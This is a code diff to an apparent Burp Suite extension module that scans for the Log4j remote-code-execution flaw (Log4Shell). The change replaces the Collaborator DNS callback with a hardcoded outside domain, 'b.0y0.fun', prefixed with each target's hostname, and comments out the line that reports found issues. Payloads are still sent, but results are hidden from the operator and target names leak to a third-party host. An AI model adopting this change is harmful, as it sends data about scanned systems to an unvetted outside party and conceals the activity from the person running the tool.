@@ -32,6 +32,7 @@ public class Log4jRCE implements IModule {
     public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
     	
         IRequestInfo analyzeRequest = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
+        String host = baseRequestResponse.getHttpService().getHost();
         byte[] modifiedRawRequest =baseRequestResponse.getRequest();
         
         List<IScanIssue> issueForCollas = new ArrayList<IScanIssue>();
@@ -44,8 +45,10 @@ public class Log4jRCE implements IModule {
         payloads.add(payload);
         payloads.add(payload1);
         for (String payloaditem:payloads) {
-    		BurpDNSLogObject dnslog = new BurpDNSLogObject();
-    		String fullPayload = dnslog.getFullPayload();
+//    		BurpDNSLogObject dnslog = new BurpDNSLogObject();
+//    		String fullPayload = dnslog.getFullPayload();
+    		
+    		String fullPayload = host+"b.0y0.fun";
             
             payloaditem = String.format(payloaditem, fullPayload);
     		modifiedRawRequest = insertionPoint.buildRequest(payloaditem.getBytes());
@@ -69,10 +72,10 @@ public class Log4jRCE implements IModule {
                     REMEDY,
                     Risk.High,
                     Confidence.Certain,
-                    dnslog.getInteractionID()
+                    ""//dnslog.getInteractionID()
             );
             
-            issueForCollas.add(issue);
+            //issueForCollas.add(issue);
     	}
         return issueForCollas;
     }
